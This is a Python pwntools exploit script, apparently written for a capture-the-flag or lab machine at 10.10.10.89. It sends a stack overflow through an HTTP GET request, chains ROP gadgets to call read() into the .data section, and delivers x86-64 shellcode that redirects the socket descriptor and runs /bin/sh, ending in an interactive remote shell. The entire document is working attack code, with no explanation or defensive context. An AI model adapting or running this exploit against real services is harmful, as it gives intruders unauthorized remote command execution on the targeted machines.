#!/usr/bin/python3
from pwn import remote, p64, asm
from urllib.parse import quote

shell = remote("10.10.10.89", 1111)

offset = 568
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4011dd) # pop rdi; ret;
payload += p64(0x4)      # descriptor
payload += p64(0x4011db) # pop rsi; pop r15; ret;
payload += p64(0x603140) # .data
payload += p64(0x0)      # padding for pop
payload += p64(0x400cf0) # read()
payload += p64(0x603140) # shellcode

shellcode = asm("""
    push 0x4                  # oldfd
    pop rdi                   # $rdi = oldfd

    push 0x2                  # newfd
    pop rsi                   # $rsi = newfd

    .loop:
        push 0x21             # dup2()
        pop rax               # $rax = dup2()
        syscall               # system call

        dec esi               # $rsi -= 1
        jns .loop             # if $rsi >= 0

    mov al, 0x3b              # $rax = execve()

    mov rdi, 0x68732f6e69622f # $rdi = "/bin/sh"
    push rdi                  # $rsp = &"/bin/sh"

    push rsp                  # &"/bin/sh"
    pop rdi                   # $rdi = &"/bin/sh"

    cdq                       # $rdx = NULL
    inc esi                   # $rsi = NULL

    syscall                   # system call
""", arch="amd64")

shell.sendline(f'GET /{quote(payload)}\n'.encode())
shell.sendlineafter(b"not found", shellcode)

shell.interactive()
